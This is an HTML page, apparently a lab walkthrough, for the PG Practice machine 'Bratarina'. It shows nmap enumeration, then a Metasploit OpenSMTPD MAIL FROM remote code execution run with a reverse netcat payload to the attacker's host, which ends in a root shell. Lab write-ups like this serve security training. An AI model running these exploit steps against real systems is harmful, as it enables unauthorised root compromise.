@@ -1,0 +1,103 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Practice : Bratarina</h1>
+    <p class="text">Difficulty : Easy | CommunityRating : Intermediate | MyRating : Easy | ClearTime : 15min</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ sudo nmap -p- 192.168.120.71 --min-rate=10000 | grep '/tcp' | cut -d'/' -f1 | paste -sd, -
+22,25,53,80,445
+
+┌──(kali㉿kali)-[~/tempo]
+└─$ sudo nmap -p 22,25,53,80,445 -sCV 192.168.120.71 --min-rate=10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 22:43 EST
+Nmap scan report for 192.168.120.71
+Host is up (0.087s latency).
+
+PORT    STATE  SERVICE     VERSION
+22/tcp  open   ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:dd:2c:ea:2f:85:c5:89:bc:fc:e9:a3:38:f0:d7:50 (RSA)
+|   256 e3:b7:65:c2:a7:8e:45:29:bb:62:ec:30:1a:eb:ed:6d (ECDSA)
+|_  256 d5:5b:79:5b:ce:48:d8:57:46:db:59:4f:cd:45:5d:ef (ED25519)
+25/tcp  open   smtp        OpenSMTPD
+| smtp-commands: bratarina Hello nmap.scanme.org [192.168.45.154], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP
+|_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info
+53/tcp  closed domain
+80/tcp  open   http        nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title:         Page not found - FlaskBB        
+445/tcp open   netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: COFFEECORP)
+Service Info: Host: bratarina; OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">SMTP v2.0.0 is open on the target. Researching its vulnerability, I found <a href="https://www.exploit-db.com/exploits/48038">this metasploit exploit file</a>.</p>
+<p class="text">┌──(kali㉿kali)-[~/tempo]
+└─$ msfconsole
+Metasploit tip: Open an interactive Ruby terminal with irb
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                    
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                    
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%                                                    
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                    
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                    
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                    
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                    
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%                                                    
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%                                                    
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%                                                    
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%                                                    
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %                                                    
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%                                                    
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%                                                    
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%                                                    
+                                                                                                                                 
+
+       =[ metasploit v6.4.99-dev                                ]
++ -- --=[ 2,572 exploits - 1,317 auxiliary - 1,683 payloads     ]
++ -- --=[ 432 post - 49 encoders - 13 nops - 9 evasion          ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > search OpenSMTPD 
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+   -  ----                                       ---------------  ----       -----  -----------
+   0  exploit/unix/smtp/opensmtpd_mail_from_rce  2020-01-28       excellent  Yes    OpenSMTPD MAIL FROM Remote Code Execution
+   1  exploit/unix/local/opensmtpd_oob_read_lpe  2020-02-24       average    Yes    OpenSMTPD OOB Read Local Privilege Escalation
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/local/opensmtpd_oob_read_lpe
+
+msf > use 0
+[*] Using configured payload cmd/unix/reverse_netcat
+msf exploit(unix/smtp/opensmtpd_mail_from_rce) > </p>
+
+<p class="text">I set options:</p>
+<div class="code-box"><pre><code>msf exploit(unix/smtp/opensmtpd_mail_from_rce) > set RHOSTS 192.168.120.71
+RHOSTS => 192.168.120.71
+msf exploit(unix/smtp/opensmtpd_mail_from_rce) > set LHOST 192.168.45.154
+LHOST => 192.168.45.154
+msf exploit(unix/smtp/opensmtpd_mail_from_rce) > set LPORT 445
+LPORT => 445
+msf exploit(unix/smtp/opensmtpd_mail_from_rce) > run</code></pre></div>
+
+<p class="text">Then, we can get root shell.</p>
+<div class="code-box"><pre><code>id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+<p class="text">Too easy.</p>
+
+</body>
+</html>
